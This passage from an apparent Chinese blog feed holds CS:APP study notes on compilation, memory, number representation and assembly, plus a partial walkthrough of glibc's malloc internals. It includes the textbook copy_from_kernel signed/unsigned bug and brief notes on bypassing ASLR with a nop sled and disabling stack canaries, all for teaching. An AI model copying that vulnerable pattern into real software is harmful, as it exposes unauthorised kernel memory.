        <content type="html"><![CDATA[<h1 id="第一章-计算机系统漫游"><a href="#第一章-计算机系统漫游" class="headerlink" title="第一章 计算机系统漫游"></a>第一章 计算机系统漫游</h1><h2 id="信息就是位-上下文"><a href="#信息就是位-上下文" class="headerlink" title="信息就是位+上下文"></a>信息就是位+上下文</h2><p><strong>源程序</strong>：由值为<strong>0和1</strong>组成的<strong>位（比特）序列</strong></p><p><strong>.c文件</strong>：以<code>ASCII</code>字符组成的文本文件，以<strong>字节序列</strong>的方式储存在文件中，每个文本行以<code>\n</code>结尾，对应数字<code>10</code></p><p><strong>字节</strong>：<strong>八个位</strong>被组成的一组称为字节</p><p><strong>二进制文件</strong>：除了只由<code>ASCII</code>码组成的<strong>文本文件</strong>，其他都是二进制文件，系统中的所有<strong>信息</strong>都是由一串<strong>比特</strong>表示</p><p><strong>区分不同数据对象的唯一方法</strong>：数据对象的<strong>上下文</strong></p><p><strong>相关组织</strong>： <code>ANSI</code>  美国国家标准学会      <code>ISO</code>  国际标准化组织</p><h2 id="程序被其他程序翻译成不同的格式"><a href="#程序被其他程序翻译成不同的格式" class="headerlink" title="程序被其他程序翻译成不同的格式"></a>程序被其他程序翻译成不同的格式</h2><p><strong>二进制磁盘文件</strong>：<strong>机器语言指令</strong>按照<strong>可执行目标程序</strong>的格式打包好之后以<strong>二进制磁盘文件</strong>的形式存放</p><p><strong>目标程序</strong>：也称为<strong>可执行目标文件</strong>，或<strong>可执行文件</strong>，可以被加载到<strong>内存</strong>中，由<strong>系统</strong>执行</p><p><strong>编译器驱动程序</strong>：用于将<strong>源文件</strong>转化为<strong>目标文件</strong></p><p><strong>编译系统</strong>：预处理器 + 编译器 + 汇编器 + 链接器</p><p><strong>将源程序转化为目标文件的四个阶段</strong></p><table><thead><tr><th>阶段</th><th>工具</th><th>结果</th><th>扩展名</th><th>文件性质</th></tr></thead><tbody><tr><td>预处理阶段</td><td>预处理器 <code>cpp</code></td><td>根据以<code>#</code>开头的命令进行<strong>预处理</strong>，读取系统头文件中的内容并且<strong>直接插入</strong>到程序文本中</td><td><code>.i</code></td><td>文本文件</td></tr><tr><td>编译阶段</td><td>编译器     <code>ccl</code></td><td>将<code>.i</code>文件翻译成<strong>汇编语言程序</strong></td><td><code>.s</code></td><td>文本文件</td></tr><tr><td>汇编阶段</td><td>汇编器     <code>as</code></td><td>将<code>.s</code>文件翻译成<strong>机器语言指令</strong>，打包成<strong>可重定位目标程序</strong>格式</td><td><code>.o</code></td><td>二进制文件</td></tr><tr><td>链接阶段</td><td>连接器     <code>ld</code></td><td>将程序中调用的函数的单独编译好的<code>.o</code>目标文件和汇编得到的<code>.o</code>文件合并成<strong>可执行文件</strong>，存在<strong>磁盘</strong></td><td><code>\</code></td><td>二进制文件</td></tr></tbody></table><p><strong>GNU项目</strong>：完整的类<code>Unix</code>系统，源代码能不受限制的被修改和传播，其环境包括**<code>EMACS</code>编辑器，<code>GCC</code>编译器，<code>GDB</code>调试器，汇编器，链接器，处理二进制文件的工具**等</p><h2 id="处理器读并解释储存在内存中的指令"><a href="#处理器读并解释储存在内存中的指令" class="headerlink" title="处理器读并解释储存在内存中的指令"></a>处理器读并解释储存在内存中的指令</h2><p><code>shell</code>：命令行解释器</p><h3 id="系统的硬件组成"><a href="#系统的硬件组成" class="headerlink" title="系统的硬件组成"></a>系统的硬件组成</h3><h4 id="总线"><a href="#总线" class="headerlink" title="总线"></a>总线</h4><p><strong>作用</strong>：<strong>携带、传递定长的字节块</strong></p><p><strong>补充</strong>：字节块 &#x3D; 字， <strong>属性</strong>： 字节数 &#x3D; 字长， <strong>机器字长</strong>： 32位中字长为4字节，64位中字长为8字节</p><h4 id="I-x2F-O设备"><a href="#I-x2F-O设备" class="headerlink" title="I&#x2F;O设备"></a>I&#x2F;O设备</h4><p><strong>功能</strong>：通过<strong>控制器</strong>或<strong>适配器</strong>与<code>I/O</code>总线相连，在<code>I/O</code>主总线和<code>I/O</code>设备之间<strong>传递信息</strong></p><p><strong>封装方式的区别</strong>：<strong>控制器</strong>是I&#x2F;O设备本身或系统主印制电路板（即<strong>主板</strong>）上的<strong>芯片组</strong>，<strong>适配器</strong>是插在<strong>主板插槽上的卡</strong></p><p><strong>例子</strong>：磁盘、键盘、显示器、网络</p><h4 id="主存"><a href="#主存" class="headerlink" title="主存"></a>主存</h4><p><strong>作用</strong>：用来存放<strong>程序和程序处理的数据</strong>的<strong>临时存储设备</strong></p><p><strong>组成</strong>：由一组<strong>动态随机存取存储器（DRAM）芯片</strong>组成的线性的<strong>字节数组</strong></p><h4 id="处理器"><a href="#处理器" class="headerlink" title="处理器"></a>处理器</h4><p><strong>别称</strong>：中央处理单元、<code>CPU</code>、中央处理器</p><p><strong>功能</strong>：解释或执行存储在主存中的指令的引擎，不断执行<code>PC</code>指向的指令，解释指令中的位，执行该指令指示的简单操作，然后更新<code>PC</code>指向下一条指令（<strong>不一定相邻</strong>）</p><p><strong>简单指令</strong>：围绕着主存、寄存器文件、算术&#x2F;逻辑单元<code>ALU</code>进行，例如：加载、存储、操作、跳转</p><p><strong>寄存器文件</strong>：是一个小的<strong>存储设备</strong>，由一些<strong>单个字长的寄存器</strong>组成</p><p><strong>指令集架构</strong>：描述每条机器代码指令的<strong>效果</strong></p><p><strong>微体系结构</strong>：描述处理器实际上是如何<strong>实现</strong></p><img src="/2023/05/04/cs-app-yue-du-bi-ji-chi-xu-geng-xin/cs-app-yue-du-bi-ji-chi-xu-geng-xin/1.jpg" class title="系统的硬件组成"><h2 id="高速缓存和存储设备形成层次结构"><a href="#高速缓存和存储设备形成层次结构" class="headerlink" title="高速缓存和存储设备形成层次结构"></a>高速缓存和存储设备形成层次结构</h2><h3 id="高速缓存cache"><a href="#高速缓存cache" class="headerlink" title="高速缓存cache"></a>高速缓存cache</h3><p><strong>作用</strong>：<strong>存放</strong>可能经常访问的<strong>数据</strong>，大部分的内存<strong>操作</strong>都能快速在高速缓存中完成，节省了内存、I&#x2F;O设备喝CPU寄存器之间的复制数据</p><h3 id="存储设备形成层次结构"><a href="#存储设备形成层次结构" class="headerlink" title="存储设备形成层次结构"></a>存储设备形成层次结构</h3><img src="/2023/05/04/cs-app-yue-du-bi-ji-chi-xu-geng-xin/cs-app-yue-du-bi-ji-chi-xu-geng-xin/2.jpg" class title="一个存储器层次结构的示例"><p><strong>主要思想</strong>：上一层的存储器作为低一层存储器的高速缓存，了解不同的高速缓存和对整个存储器层次结构可以提高程序性能</p><h2 id="操作系统管理硬件"><a href="#操作系统管理硬件" class="headerlink" title="操作系统管理硬件"></a>操作系统管理硬件</h2><h3 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h3><p><strong>功能</strong></p><ul><li>防止硬件被失控的应用程序滥用</li><li>向应用程序提供简单一致的机制来控制复杂而又通常大不相同的低级硬件设备，<strong>所有应用程序对硬件的操作都必须通过操作系统</strong></li></ul><p><strong>实现</strong>：通过进程、虚拟内存、文件实现</p><img src="/2023/05/04/cs-app-yue-du-bi-ji-chi-xu-geng-xin/cs-app-yue-du-bi-ji-chi-xu-geng-xin/3.jpg" class title="操作系统提供的抽象表示"><h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><p><strong>进程</strong>：操作系统对正在运行的程序的一种抽象</p><p><strong>并发运行</strong>：一个进程的指令和另一个进程的指令是<strong>交错执行</strong>的</p><p><strong>上下文</strong>：<strong>操作系统</strong>保持根据进程运行所需的所有<strong>状态信息</strong>，这种状态成为上下文</p><p><strong>上下文切换</strong>：操作系统<strong>实现交错执行的机制</strong>，执行的是<strong>内核代码</strong></p><p><strong>单处理器系统</strong>：只能执行<strong>一个进程</strong>代码，系统绝对把控制权从当前进程转移到新进程就会上下文切换，控制权传递到新进程</p><p><strong>内核kernel</strong>：从一个进程到另一个进程的<strong>转换</strong>是由操作系统内核<strong>管理</strong>的，内核时<strong>操作系统</strong>代码常驻主存的部分，不是一个独立的进程，而是系统管理全部进程所用代码和数据结构的集合。</p><p><strong>系统调用</strong>：应用程序需要系统的某些操作时，执行系统调用将<strong>控制权</strong>传递给操作系统<strong>内核</strong>，内核执行被请求的操作并返回应用程序</p><img src="/2023/05/04/cs-app-yue-du-bi-ji-chi-xu-geng-xin/cs-app-yue-du-bi-ji-chi-xu-geng-xin/4.jpg" class title="进程的上下文切换"><h3 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h3><p><strong>线程</strong>: 组成进程的<strong>执行单元</strong>，运行在进程的上下文中，每个线程共享同样的代码和全局数据</p><p><strong>多线程的优点</strong>：容易共享数据，高效，运行的快</p><h3 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h3><p><strong>虚拟内存</strong>：是一个抽象概念，为每个进程提供了独占的使用主存的假象，其运作需要硬件和操作系统软件的交互</p><p><strong>虚拟地址空间</strong>：每个进程看到的一致的内存</p><p><strong>虚拟地址空间的区域</strong>（由低地址到高地址）</p><table><thead><tr><th>区域名称</th><th>内容</th></tr></thead><tbody><tr><td>程序代码和数据</td><td>代码从固定地址开始，接着是C全局变量对应的数据位置</td></tr><tr><td>堆</td><td>动态扩展和收缩</td></tr><tr><td>共享库</td><td>存放例如C标准库、数学库这样的共享库的代码和数据的区域</td></tr><tr><td>栈</td><td>用户虚拟地址空间顶部的是用户栈，用于实现函数调用，动态扩展和收缩，调用函数时栈增长，反之收缩</td></tr><tr><td>内核虚拟内存</td><td>地址空间顶部，不允许应用程序读写或直接调用内核代码定义的函数，必须调用内核来执行</td></tr></tbody></table><p><strong>基本思想</strong>：把一个进程虚拟内存的内容存储在磁盘上，然后用主存作为磁盘的高速缓存</p><h1 id="第二章-信息的表示和处理"><a href="#第二章-信息的表示和处理" class="headerlink" title="第二章 信息的表示和处理"></a>第二章 信息的表示和处理</h1><h2 id="信息存储"><a href="#信息存储" class="headerlink" title="信息存储"></a>信息存储</h2><h3 id="十六进制"><a href="#十六进制" class="headerlink" title="十六进制"></a>十六进制</h3><p><strong>特点</strong>：每个数字占<strong>4位</strong></p><p><strong>十六进制转二进制</strong>：直接将每个数字的二进制依次排列即可</p><p><strong>二进制转十六进制</strong>：则从后往前每四位分一部分最前面不足补0</p><h3 id="字节顺序"><a href="#字节顺序" class="headerlink" title="字节顺序"></a>字节顺序</h3><p><strong>小端法和大端法</strong>：大端法是正序，从最低有效字节到最高有效字节，小端法相反。大多机器使用小端法</p><img src="/2023/05/04/cs-app-yue-du-bi-ji-chi-xu-geng-xin/cs-app-yue-du-bi-ji-chi-xu-geng-xin/5.jpg" class title="0x1234567的大端序和小端序"><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p><strong>特点</strong>：以<code>null</code>（值为<code>0</code>）结尾，数字<code>x</code>的<code>ASCII</code>码为<code>0x3x</code>，不受大端小端的影响在任何系统结果相同</p><h3 id="位移运算"><a href="#位移运算" class="headerlink" title="位移运算"></a>位移运算</h3><p><strong>左移</strong>：末尾补<code>k</code>个<code>0</code>，取后<code>m</code>位</p><p><strong>逻辑右移</strong>：前补<code>k</code>个<code>0</code>，取前<code>m</code>位（无符号数）</p><p><strong>算数右移</strong>：前补<code>k</code>个首位的数，取前<code>m</code>位（常用）</p><p><strong>特殊情况</strong>：<code>k &gt; m</code>，则位移 <code>k mod m</code>位</p><h2 id="整数表示"><a href="#整数表示" class="headerlink" title="整数表示"></a>整数表示</h2><h3 id="有符号数与无符号数的数值范围"><a href="#有符号数与无符号数的数值范围" class="headerlink" title="有符号数与无符号数的数值范围"></a>有符号数与无符号数的数值范围</h3><table><thead><tr><th>符号</th><th>数值</th></tr></thead><tbody><tr><td><code>UMaxw</code></td><td>2^w - 1</td></tr><tr><td><code>UMinw</code></td><td>0</td></tr><tr><td><code>TMaxw</code></td><td>2^（w-1） - 1</td></tr><tr><td><code>TMinw</code></td><td>-2^（w - 1）</td></tr></tbody></table><pre class="line-numbers language-C" data-language="C"><code class="language-C">#define INT_MAX 2147483647#define INT_MIN (-INT_MAX - 1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>不对称性</strong>：<code>|TMinw| = |TMaxw| + 1UMaxw = 2TMaxw + </code>，因此不是所有负数都存在相反数</p><h3 id="补码two’s-complement"><a href="#补码two’s-complement" class="headerlink" title="补码two’s complement"></a>补码two’s complement</h3><p><strong>特点</strong>：将最高有效位解释为负权，也称符号位，权重为<code>-2^w-1</code>（其二进制共w位），正数补码为原码，负数补码为其二进制取反后加一</p><p><strong>转换为无符号数的规则</strong>：位值不变，只是改变了最高位的解释位的方式，即是否为符号位</p><p><strong>转换计算方法</strong>:-1 和<code>UMaxw</code>位表示相同，全1的串,<code>0 ~ TMaxw</code>之内转换数值不变，范围之外转换加上或减去<code>2^w</code></p><p><strong>隐式类型转换</strong>：</p><ul><li><p>相互赋值</p></li><li><p><code>printf</code>输出时使用不对应的格式化字符串</p></li><li><p>算术运算或比较一边存在无符号数则另外一边强制转为无符号数</p></li></ul><h3 id="扩展和截断"><a href="#扩展和截断" class="headerlink" title="扩展和截断"></a>扩展和截断</h3><p><strong>无符号数转换为一个更大的数据类型</strong>：零扩展，即二进制前导补<code>0</code></p><p><strong>补码转换为一个更大的数据类型</strong>：符号扩展，即二进制前导补符号扩展位的值</p><p><strong>长度不同的类型之间的转换</strong>：长度转一致之后再类型转换，如<code>short</code>转<code>unsigned</code>要先转为<code>int</code>再转<code>unsigned</code></p><p><strong>截断规则</strong>：舍弃高位，补码将最高位转换为符号位</p><h3 id="关于符号数与无符号数的建议"><a href="#关于符号数与无符号数的建议" class="headerlink" title="关于符号数与无符号数的建议"></a>关于符号数与无符号数的建议</h3><p>尽量避免无符号&#x2F;有符号类型的混用，因为这样可能会进行隐式类型转换，造成非预期的错误</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">#define KSIZE 1024char kbuf[KSIZE];void *memcpy(void *dest, void*src, size_t n);int copy_from_kernel(void* user_dest, int maxlen)&#123;  int len &#x3D; KSIZE &lt; maxlen ? KSIZE : maxlen;  memcpy(user_dest, kbuf, len);  return len;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>例中，<code>memcpy</code>函数的定义中<code>n</code>类型为<code>size_t</code>，若<code>len</code>输入负数则会导致<code>n</code>为一个很大的数，使程序读取到它没有被被授权的内核内存区域</p><h2 id="IEEE浮点表示"><a href="#IEEE浮点表示" class="headerlink" title="IEEE浮点表示"></a>IEEE浮点表示</h2><p>公式： <code>V = （-1）^s * M * 2^E</code></p><table><thead><tr><th>位名称</th><th>释义和值</th></tr></thead><tbody><tr><td>s</td><td>符号位，一个单独的位编码符号位</td></tr><tr><td>M</td><td>尾数，一个二进制小数，编码为n位小数字段frac</td></tr><tr><td>E</td><td>阶码，用于对浮点加权，编码为k为的阶码字段exp，被解释为以偏置形式表示的有符号整数</td></tr><tr><td>f</td><td>frac &#x2F; 2 ^ n</td></tr><tr><td>Bias</td><td>偏置值，2^（k-1） - 1</td></tr></tbody></table><table><thead><tr><th>类别</th><th>特点</th><th>E</th><th>M</th></tr></thead><tbody><tr><td>规格化的值</td><td>阶码域有0有1</td><td>e - Bias</td><td>1 + f</td></tr><tr><td>非规格化的值</td><td>阶码域全为0</td><td>1 - Bias</td><td>f</td></tr><tr><td>特殊值</td><td>阶码域全为1，s &#x3D; 0为正无穷，s&#x3D;1为负无穷，能够表示溢出的结果，小数域非0称为NaN</td><td>\</td><td>\</td></tr></tbody></table><img src="/2023/05/04/cs-app-yue-du-bi-ji-chi-xu-geng-xin/cs-app-yue-du-bi-ji-chi-xu-geng-xin/6.jpg" class title="标准浮点格式"><img src="/2023/05/04/cs-app-yue-du-bi-ji-chi-xu-geng-xin/cs-app-yue-du-bi-ji-chi-xu-geng-xin/7.jpg" class title="单精度浮点数值分类"><img src="/2023/05/04/cs-app-yue-du-bi-ji-chi-xu-geng-xin/cs-app-yue-du-bi-ji-chi-xu-geng-xin/8.jpg" class title="8位浮点格式的非负值示例"><p><strong>注意</strong>：浮点数可以表示的值范围比整数大但只是近似表示，数字越大精度越低，其运算不具有结合性，且单精度与双精度值进行比较可能会发生错误，当超过最大的规格化的值时会发生溢出</p><h1 id="第三章-程序的机器级表示"><a href="#第三章-程序的机器级表示" class="headerlink" title="第三章 程序的机器级表示"></a>第三章 程序的机器级表示</h1><h2 id="条件分支"><a href="#条件分支" class="headerlink" title="条件分支"></a>条件分支</h2><ul><li><p>用条件转移实现条件分支</p><p>在现代处理器上会非常低效，因为处理器通过使用流水线来获得高性能，要求能够实现确定执行的指令序列。当机器遇到条件跳转时只有当分支条件求值完成才能决定走哪条分支，处理器会采用分支预测逻辑来猜测每条跳转指令是否执行，当预测错误时会严重降低性能</p></li><li><p>用条件传送来实现条件分支</p><p>计算一个条件操作的两种结果，然后根据条件是否满足从中选取一个</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;计算两个数的差的绝对值&#x2F;&#x2F;使用条件转移long cmowdiff (long x, long y)&#123;long result;if(x &lt; y)result &#x3D; y - x;else result &#x3D; x - y;return result;&#125;&#x2F;&#x2F;使用条件传送long cmowdiff (long x, long y)&#123;    long rval &#x3D; y - x;    long eval &#x3D; x - y;    long ntest &#x3D; x &gt;&#x3D; y;    if(ntest)rval &#x3D; eval;    return rval;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="浮点代码"><a href="#浮点代码" class="headerlink" title="浮点代码"></a>浮点代码</h2><p>浮点代码使用的寄存器是<code>ymm0~ymm15</code>，可以保存<code>32</code>字节，其低<code>16</code>字节是<code>xmm</code>寄存器,浮点函数的</p><p>xmm寄存器用来向函数传递和返回浮点数，函数使用xmm0返回浮点值</p><h2 id="数据格式"><a href="#数据格式" class="headerlink" title="数据格式"></a>数据格式</h2><table><thead><tr><th>数据类型</th><th>术语</th><th>汇编代码</th><th>大小</th></tr></thead><tbody><tr><td>字节</td><td>byte</td><td>b</td><td>1字节    8位</td></tr><tr><td>字</td><td>word</td><td>w</td><td>2字节   16位</td></tr><tr><td>双字</td><td>double words</td><td>l</td><td>4字节   32位</td></tr><tr><td>四字</td><td>quad words</td><td>q</td><td>8字节    64位</td></tr></tbody></table><h2 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h2><pre class="line-numbers language-none"><code class="language-none">lea加载有效地址inc 加1dec减1neg取负sal左移sar算数右移shr逻辑右移mul乘cqto转换为8字div除cmp比较test测试set将一个字节设置为0或1CF进位标志，检查无符号操作的溢出ZF零标志SF符号标志OF溢出标志，补码的正&#x2F;负溢出<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>形式包括：函数，方法，子例程，处理函数</p><p>栈帧：存储空间超出寄存器能够存放的大小时就会在栈上分配空间，这个部分成为过程的栈帧，栈指针是<code>rsp</code>，帧指针是<code>rbp</code></p><h2 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h2><pre class="line-numbers language-none"><code class="language-none">kill    停止程序delete      删除断点info frame    有关当前栈帧的信息info registers所有寄存器值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="对抗缓冲区溢出攻击"><a href="#对抗缓冲区溢出攻击" class="headerlink" title="对抗缓冲区溢出攻击"></a>对抗缓冲区溢出攻击</h2><p><code>ASLR</code>：通过在程序开始时分配一段随机大小的空间而不使用，使得后续栈位置发生变化。可以通过在攻击代码前插入<code>nop</code>滑过随机大小的序列</p><p><code>NX</code>：限制可执行代码区域，堆栈不可执行</p><p><code>canary</code>：检测缓冲区越界，可以使用<code>-fno-stack-protector</code>关闭<code>canary</code>保护</p>]]></content>
      
      
      <categories>
          
          <category> 计算机系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>glibc源码分析-malloc-free</title>
      <link href="/2023/04/22/glibc-yuan-ma-fen-xi-malloc-free/glibc-yuan-ma-fen-xi-malloc-free/"/>
      <url>/2023/04/22/glibc-yuan-ma-fen-xi-malloc-free/glibc-yuan-ma-fen-xi-malloc-free/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="相关结构体"><a href="#相关结构体" class="headerlink" title="相关结构体"></a>相关结构体</h1><h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">struct malloc_state&#123;  &#x2F;* Serialize access.  *&#x2F;  mutex_t mutex;  &#x2F;* Flags (formerly in max_fast).  *&#x2F;  int flags;  &#x2F;* Fastbins *&#x2F;  mfastbinptr fastbinsY[NFASTBINS];  &#x2F;* Base of the topmost chunk -- not otherwise kept in a bin *&#x2F;  mchunkptr top;  &#x2F;* The remainder from the most recent split of a small request *&#x2F;  mchunkptr last_remainder;  &#x2F;* Normal bins packed as described above *&#x2F;  mchunkptr bins[NBINS * 2 - 2];  &#x2F;* Bitmap of bins *&#x2F;  unsigned int binmap[BINMAPSIZE];  &#x2F;* Linked list *&#x2F;  struct malloc_state *next;  &#x2F;* Linked list for free arenas.  Access to this field is serialized     by free_list_lock in arena.c.  *&#x2F;  struct malloc_state *next_free;  &#x2F;* Number of threads attached to this arena.  0 if the arena is on     the free list.  Access to this field is serialized by     free_list_lock in arena.c.  *&#x2F;  INTERNAL_SIZE_T attached_threads;  &#x2F;* Memory allocated from the system in this arena.  *&#x2F;  INTERNAL_SIZE_T system_mem;  INTERNAL_SIZE_T max_system_mem;&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">struct malloc_chunk &#123;  INTERNAL_SIZE_T      mchunk_prev_size;  &#x2F;* Size of previous chunk (if free).  *&#x2F;  INTERNAL_SIZE_T      mchunk_size;       &#x2F;* Size in bytes, including overhead. *&#x2F;  struct malloc_chunk* fd;         &#x2F;* double links -- used only if free. *&#x2F;  struct malloc_chunk* bk;  &#x2F;* Only used for large blocks: pointer to next larger size.  *&#x2F;  struct malloc_chunk* fd_nextsize; &#x2F;* double links -- used only if free. *&#x2F;  struct malloc_chunk* bk_nextsize;&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="初次创建堆"><a href="#初次创建堆" class="headerlink" title="初次创建堆"></a>初次创建堆</h1><h2 id="非mmap"><a href="#非mmap" class="headerlink" title="非mmap"></a>非mmap</h2><h3 id="源程序"><a href="#源程序" class="headerlink" title="源程序"></a>源程序</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdlib.h&gt;int main(int argc, char **argv)&#123;malloc(0x30);return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="运行过程"><a href="#运行过程" class="headerlink" title="运行过程"></a>运行过程</h3><ul><li><p>进入<code>__libc_malloc  </code></p></li><li><p>调用<code>__malloc_hook</code>中的函数来完成堆分配并返回，若为默认值则向下运行</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">void *(*hook) (size_t, const void *)    &#x3D; atomic_forced_read (__malloc_hook);  if (__builtin_expect (hook !&#x3D; NULL, 0))    return (*hook)(bytes, RETURN_ADDRESS (0));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>程序第一次运行<code>__libc_malloc  </code>时，<code>__malloc_hook</code>中的值是<code>hook.c</code>中的<code>malloc_hook_ini</code>函数，因此会调用该函数，用于对<code>__malloc_hook</code>进行初始化，初始化结束后值为0，后续再创建堆就是默认值0</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">malloc_hook_ini (size_t sz, const void *caller)&#123;  __malloc_hook &#x3D; NULL;  ptmalloc_init ();  return __libc_malloc (sz);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>初始化过程：设置<code>__malloc_hook</code>为NULL，再调用<code>arena.c</code>中的<code>ptmalloc_init</code>进行初始化，<code>__malloc_initialized &gt; 0 </code>表示初始化完成</p></li><li><p>补充：<code>__builtin_expect</code></p><ul><li><p>作用：允许程序员将最有可能执行的分支告诉编译器</p></li><li><p>写法：<code>__builtin_expect(EXP, N)</code></p></li><li><p>含义：<code>EXP==N</code>的概率很大</p></li><li><p>返回值：当<code>EXP==N</code>时返回0，反之返回1</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">#define unlikely(x) __builtin_expect(!!(x), 0) &#x2F;&#x2F;x很可能为假#define likely(x) __builtin_expect(!!(x), 1) &#x2F;&#x2F;x很可能为真<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;if成立的条件是hook !&#x3D; NULL成立，即hook不为空，则去调用hook中的函数if (__builtin_expect (hook !&#x3D; NULL, 0))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul></li></ul></li><li><p>调用<code>arena_get</code> 获取到管理空闲空间的分配区地址，申请的堆块就在这里</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">arena_get (ar_ptr, bytes);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>进入<code>_int_malloc</code>函数</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">victim &#x3D; _int_malloc (ar_ptr, bytes);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>victim</code>指向<code>_int_malloc</code>分配的内存</p></li><li><p>计算分配的实际大小</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">checked_request2size (bytes, nb);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong><code>ptmalloc</code> 以 chunk 为单位分配空间，传入的bytes 是用户提交的原始的空间大小</strong></p><p><strong><code>nb</code> 是为计算得到的 chunk 的大小</strong></p></li><li><p>检查是否有可用空间</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (__glibc_unlikely (av &#x3D;&#x3D; NULL))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong><code>av = ar_ptr </code>是<code>arena_get</code> 获取到的分配区地址指针</strong></p></li><li><p>判断是否属于<code>fastbin</code></p><ul><li><p>通过判断<code>nb &lt;= get_max_fast()</code>即申请的实际大小是否小于<code>fastbin</code>最大值来判断是否属于<code>fastbin</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if ((unsigned long) (nb) &lt;&#x3D; (unsigned long) (get_max_fast ()))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>属于<code>fastbin</code>则继续运行</p></li><li><p>获取实际大小<code>nb</code>所在的<code>fastbin</code>链表的<code>index</code>，并且获取指向该链表的第一个结点的指针</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">idx &#x3D; fastbin_index (nb);mfastbinptr *fb &#x3D; &amp;fastbin (av, idx);mchunkptr pp &#x3D; *fb;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>判断指向的chunk是否为空</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">do&#123;     victim &#x3D; pp;        if (victim &#x3D;&#x3D; NULL)        break;&#125;while ((pp &#x3D; catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该 chunk 为空，说明当前 <code>fastbin </code>中没有刚好匹配 <code>nb </code>大小的空闲 <code>chunk</code></p></li></ul></li><li><p>判断是否属于<code>smallbin</code></p><ul><li><p>通过调用<code>in_smallbin_range</code>函数判断是否属于<code>smallbin</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (in_smallbin_range (nb))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>获取该大小所在的链表的<code>index</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">idx &#x3D; smallbin_index (nb);bin &#x3D; bin_at (av, idx);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>判断<code>smallbin</code>是否为空，为空则跳过剩下的代码</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if ((victim &#x3D; last (bin)) !&#x3D; bin)    &#123;          if (victim &#x3D;&#x3D; 0) &#x2F;* initialization check *&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul></li></ul><p>​<code>victim</code>指向<code>smallbin</code>中的最后一个bin，若其为空则<code>smallbin</code>为空</p><ul><li><p>调用<code>malloc_consolidate 